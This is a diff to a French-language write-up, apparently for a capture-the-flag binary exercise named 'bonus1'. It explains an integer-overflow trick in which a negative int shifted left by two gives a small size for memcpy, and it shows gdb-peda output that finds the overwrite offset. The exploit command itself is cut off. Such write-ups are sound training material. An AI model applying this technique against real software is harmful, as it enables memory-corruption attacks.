@@ -3,6 +3,8 @@
 - On voit que dans le code les bit sont decaler de deux pour calculer la taille
 - Le premier bit d'un int sert a savoir si il est negatif ou positif
 - Donc tout les nombres negatif seront converti en nombre positif
+
+- On regarde donc combien il faut ecrire pour ecrire par dessus la variable m
 <pre>
 [alarmv@alarm Ressources]$ gdb ./bonus1 
 gdb-peda$ pattern create 75
@@ -19,7 +21,7 @@ gdb-peda$ x $esp+0x3c
 gdb-peda$ pattern offset AA0AAFA
 AA0AAFA found at offset: <strong>40</strong>
 </pre>
-- Il faut donc ecrire 44 caractere dans memcpy se qui fait **101100** en binaire
+- Il faut donc ecrire 44 caracteres dans memcpy se qui fait **101100** en binaire
 - Avec `<< 2` il faut que le int soit egale a **10000000000000000000000000001011** se qui fait -2147483637
 - Donc on peut executé la commande ci contre
 ```
